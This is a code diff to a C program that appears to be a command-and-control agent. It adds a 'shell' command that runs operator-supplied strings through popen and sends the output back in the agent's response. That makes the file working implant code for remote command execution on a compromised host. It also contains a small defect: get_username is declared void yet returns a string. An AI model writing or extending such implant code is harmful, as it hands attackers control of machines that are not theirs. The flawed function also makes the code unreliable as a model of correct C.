@@ -14,7 +14,7 @@
 
 void get_username(OutboundJsonDataStruct* response_struct);
 void set_response_data(OutboundJsonDataStruct* response_struct, const char* data);
-
+void execute_shell_command(OutboundJsonDataStruct* response_struct, const char* command);
 // ====================
 // Functions
 // ====================
@@ -42,11 +42,11 @@ int parse_command(char* command, char* args, OutboundJsonDataStruct* response_st
     DEBUG_LOG("Struct UUID: %s\n", response_struct->agent_id);
     DEBUG_LOG("Struct command_result_data: %s\n", response_struct->command_result_data);
 
-    if (strcmp(command, "whoami") == 0) {
-        DEBUG_LOG("[COMMAND] whoami\n");
-        get_username(response_struct);
+    if (strcmp(command, "shell") == 0) {
+        DEBUG_LOG("[COMMAND] shell\n");
+        execute_shell_command(response_struct, args);
     }  
-    if (strcmp(command, "help") == 0) {
+    else if (strcmp(command, "help") == 0) {
         DEBUG_LOG("[COMMAND] help\n");
         set_response_data(response_struct, "Help Menu Placeholder");
     }
@@ -61,4 +61,52 @@ int parse_command(char* command, char* args, OutboundJsonDataStruct* response_st
 
 void get_username(OutboundJsonDataStruct* response_struct){
     return "FAKEUSERNAME";
+}
+
+// Generic function to execute a shell command and capture its output
+//not chatGPT'd at all
+void execute_shell_command(OutboundJsonDataStruct* response_struct, const char* command) {
+    FILE *fp = popen(command, "r");
+    if (!fp) {
+        DEBUG_LOG("Failed to execute command: %s\n", command);
+        set_response_data(response_struct, "Error executing command");
+        return;
+    }
+
+    // Allocate an initial buffer for the output.
+    size_t capacity = 256;
+    size_t length = 0;
+    char *output = malloc(capacity);
+    if (!output) {
+        DEBUG_LOG("Memory allocation failed\n");
+        pclose(fp);
+        set_response_data(response_struct, "Memory allocation failed");
+        return;
+    }
+    output[0] = '\0';
+
+    // Read output from the command
+    char buffer[256];
+    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
+        size_t chunk_length = strlen(buffer);
+        // Ensure our output buffer is large enough.
+        if (length + chunk_length + 1 > capacity) {
+            capacity *= 2;
+            char *temp = realloc(output, capacity);
+            if (!temp) {
+                free(output);
+                pclose(fp);
+                set_response_data(response_struct, "Memory allocation failed");
+                return;
+            }
+            output = temp;
+        }
+        strcpy(output + length, buffer);
+        length += chunk_length;
+    }
+    pclose(fp);
+
+    DEBUG_LOG("Shell command output: %s\n", output);
+    set_response_data(response_struct, output);
+    free(output);
 }
